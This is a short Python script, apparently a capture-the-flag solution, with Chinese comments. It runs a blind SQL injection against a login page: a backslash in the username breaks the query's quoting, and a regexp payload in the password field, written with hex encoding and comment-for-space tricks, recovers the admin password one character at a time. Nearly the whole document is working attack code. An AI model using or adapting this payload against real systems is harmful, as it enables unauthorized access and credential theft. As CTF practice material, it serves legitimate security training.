# 通过regexp匹配密码，获取正确密码后得到flag
import requests
import string

def str2hex(string):
  result = ''
  for i in string:
    result += hex(ord(i))
  result = result.replace('0x','')
  return '0x'+result

#这里字符集和去掉了*，因为它匹配任何值
strs = string.ascii_letters+string.digits+"!@#$%^&()_+{}-="
url = "http://eci-2zebsgq27sdoyi0ur0wn.cloudeci1.ichunqiu.com/index.php"
headers = {
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:74.0) Gecko/20100101 Firefox/74.0'
}
payload = 'or/**/password/**/regexp/**/binary/**/{}#'
if __name__ == "__main__":
    name = ''
    for i in range(1,40):
        for j in strs:
            passwd = str2hex('^'+name+j)
            print(name)
            print(passwd)
            payloads = payload.format(passwd)
            postdata={
                'username':'admin\\',
                'password':payloads
            }
            r = requests.post(url,data=postdata,headers=headers)
            if "flag" in r.text:
                name += j
                print(j,end='')
                break